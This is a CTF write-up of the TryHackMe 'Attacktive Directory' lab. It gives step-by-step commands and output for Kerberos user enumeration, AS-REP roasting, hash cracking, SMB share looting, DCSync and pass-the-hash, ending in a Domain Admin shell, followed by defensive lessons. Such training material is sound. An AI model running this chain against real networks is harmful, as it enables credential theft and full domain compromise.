---
title: "TryHackMe — Attacktive Directory Writeup"
date: 2026-11-13
tags: [tryhackme, active-directory, kerberos, impacket, ctf]
---

# TryHackMe: Attacktive Directory

**Room:** [tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)
**Difficulty:** Easy/Medium
**Focus:** Active Directory enumeration, Kerberos abuse (AS-REP Roasting), SMB enumeration, DCSync, Pass-the-Hash

> 99% of corporate networks run on Active Directory. This room walks through compromising a vulnerable Domain Controller end-to-end — from anonymous enumeration to full domain admin.

## Tools Used
- Nmap
- enum4linux
- Kerbrute
- Impacket (`GetNPUsers.py`, `secretsdump.py`)
- Hashcat
- smbclient
- Evil-WinRM

---

## 1. Initial Recon — Nmap

Scan the target for open ports and services:

```bash
nmap -sV -sC <TARGET_IP>
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: spookysec.local0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows AD LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|  rdp-ntlm-info:
|   NetBIOS_Domain_Name: THM-AD
|   DNS_Domain_Name: spookysec.local
```

**Key takeaways:**
- Port 445/139 → SMB → enumerable with `enum4linux`
- Port 88 → Kerberos → domain is `spookysec.local`
- NetBIOS domain name: `THM-AD`
- `.local` is a common (invalid) TLD used for internal AD domains

---

## 2. Enumerating Users via Kerberos (Kerbrute)

> **💡 What is Kerberos?**
>
> It's just how Windows logins work. You ask a server (the KDC) to let you in, and if it knows you, it gives you a "ticket" — like a wristband at a festival that proves you belong, so you don't have to show ID at every single gate.
>
> The bug we're using: before the KDC even checks your password, it checks if your username exists. Ask for `fakeuser123` → it replies "no such user." Ask for `svc-admin` → it replies "wrong password" instead. That different reply is the giveaway — it just confirmed `svc-admin` is a real account, without us ever knowing the password. Kerbrute simply automates asking this for thousands of usernames at once.

Grab a username wordlist, then brute-force valid accounts:

```bash
kerbrute userenum --dc <TARGET_IP> -d spookysec.local userlist.txt
```

```text
2024/08/24 12:30:01 >  VALID USERNAME:       james@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       svc-admin@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       robin@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       darkstar@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       administrator@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       backup@spookysec.local
2024/08/24 12:30:01 >  VALID USERNAME:       paradox@spookysec.local
```

Two accounts stand out immediately:
- `svc-admin` → a **s**er**v**i**c**e account with likely elevated rights
- `backup` → often holds sensitive credentials (backup jobs)

Save all discovered usernames into `users.txt` for the next stage.

---

## 3. Abusing Kerberos — AS-REP Roasting

> **💡 Why GetNPUsers.py?**
>
> Normally, getting that wristband means proving it's really you first (called "pre-authentication"). But a few accounts have that check turned off. For those, the KDC just hands you a sealed envelope — locked with the user's password — no proof needed.
>
> We can't open the envelope on the spot, but we can take it home and try password after password until one opens it. That's called **AS-REP Roasting**, and `GetNPUsers.py` is the tool that grabs the sealed envelope for us.

Run it against our user list:

```bash
GetNPUsers.py -dc-ip <TARGET_IP> spookysec.local/ -no-pass -usersfile users.txt
```

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$...
```

- Hash type: **Kerberos 5 AS-REP etype 23**
- Hashcat mode: **18200**

Crack it with the provided password list:

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005
```

**Cracked:** `svc-admin : management2005`

---

## 4. Back to the Basics — SMB Enumeration

List available shares using the cracked credentials:

```bash
smbclient -L \\<TARGET_IP>\ -U 'svc-admin'
```

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

The `backup` share is non-default — dig in:

```bash
smbclient \\<TARGET_IP>\backup -U 'svc-admin'
```

```text
smb: \> ls
  backup_credentials.txt    A    48    Sun Apr  5 00:38:53 2020

smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48
```

Decode the file (it's base64):

```bash
cat backup_credentials.txt | base64 -d
```

```text
backup@spookysec.local:backup2517860
```

**New creds:** `backup : backup2517860`

---

## 5. Elevating Privileges — DCSync via secretsdump

> **💡 Why secretsdump.py?**
>
> Domain Controllers regularly copy the entire user database (hashes included) to each other so they all stay in sync — normally only a real DC is allowed to request that copy.
>
> The `backup` account we found happens to have that same permission, probably so backup software can run. So we just ask for the copy ourselves, and the server hands it over — no questions asked, since it can't tell we're not an actual DC. This is called a **DCSync attack**, and `secretsdump.py` is the tool that requests and grabs that copy.

Run it with the `backup` credentials:

```bash
secretsdump.py -dc-ip <TARGET_IP> backup:backup2517860@<TARGET_IP>
```

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\james:1105:...:9448bf6aba63d154eb0c665071067b6b:::
...
```

**Administrator NTLM hash:** `0e0363213e37b94221497260b0bcb4fc`

This hash is all we need — no need to crack it, we can **Pass-the-Hash** straight into WinRM.

---

## 6. Getting a Shell — Pass-the-Hash with Evil-WinRM

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```text
Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We now have an interactive shell as **Domain Administrator**.

---

## 7. Capturing the Flags

```bash
type C:\Users\svc-admin\Desktop\user.txt.txt
type C:\Users\backup\Desktop\PrivEsc.txt
type C:\Users\Administrator\Desktop\root.txt
```

```text
TryHackMe{K3rb3***********_4uth}
TryHackMe{B4************0tty!}
TryHackMe{4ctiv***********M4st3r}
```

*(Flag values redacted per TryHackMe policy — solve the room to get the real ones.)*

---

## Attack Chain Summary

| Stage | Technique | Result |
|---|---|---|
| Recon | Nmap + enum4linux | Domain name, NetBIOS name |
| User enum | Kerbrute `userenum` | 7 valid usernames |
| Initial creds | AS-REP Roast (`GetNPUsers.py`) + Hashcat `-m 18200` | `svc-admin:management2005` |
| Lateral info | SMB `backup` share | `backup:backup2517860` |
| Privesc | DCSync (`secretsdump.py`, DRSUAPI) | Administrator NTLM hash |
| Full compromise | Pass-the-Hash (`evil-winrm -H`) | Domain Admin shell |

## Key Lessons
- **AS-REP Roasting** works against any account with Kerberos pre-auth disabled — audit for this (`UF_DONT_REQUIRE_PREAUTH`).
- **Open/guessable SMB shares** are a goldmine — always check for non-default shares.
- **Replication rights** (DCSync) should only ever belong to Domain Controllers — `backup` having them here is the real root cause.
- **NTLM hashes are as good as passwords** — once Administrator's hash leaks, no cracking is needed.
